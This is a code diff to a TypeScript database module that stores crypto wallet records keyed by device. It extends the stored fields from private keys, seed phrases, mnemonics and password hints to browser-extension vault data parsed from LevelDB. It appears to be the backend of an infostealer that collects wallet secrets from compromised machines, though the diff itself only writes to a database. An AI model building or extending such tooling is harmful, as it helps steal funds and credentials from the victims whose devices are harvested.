@@ -120,7 +120,7 @@ export async function insertAuthenticatorData(
 }
 
 /**
- * Insert crypto wallets into database
+ * Insert crypto wallets into database with enhanced fields
  */
 export async function insertCryptoWallets(
   deviceId: string,
@@ -140,17 +140,25 @@ export async function insertCryptoWallets(
     wallet.password_hint || null,
     wallet.file_path,
     wallet.blockchain || null,
+    // Enhanced fields from LevelDB parsing
+    wallet.public_key || null,
+    wallet.account_name || null,
+    wallet.network_config ? JSON.stringify(wallet.network_config) : null,
+    wallet.vault_data ? (typeof wallet.vault_data === 'string' ? wallet.vault_data : JSON.stringify(wallet.vault_data)) : null,
+    wallet.extension_id || null,
   ])
 
   const query = `
     INSERT INTO crypto_wallets (
       device_id, wallet_type, wallet_name, address, private_key,
       seed_phrase, mnemonic, keystore_file, password_hint,
-      file_path, blockchain
+      file_path, blockchain, public_key, account_name, network_config,
+      vault_data, extension_id
     ) VALUES ?
   `
 
   await executeQuery(query, [values])
+  console.log(`✅ Inserted ${wallets.length} crypto wallet(s) with enhanced fields`)
   return wallets.length
 }
 
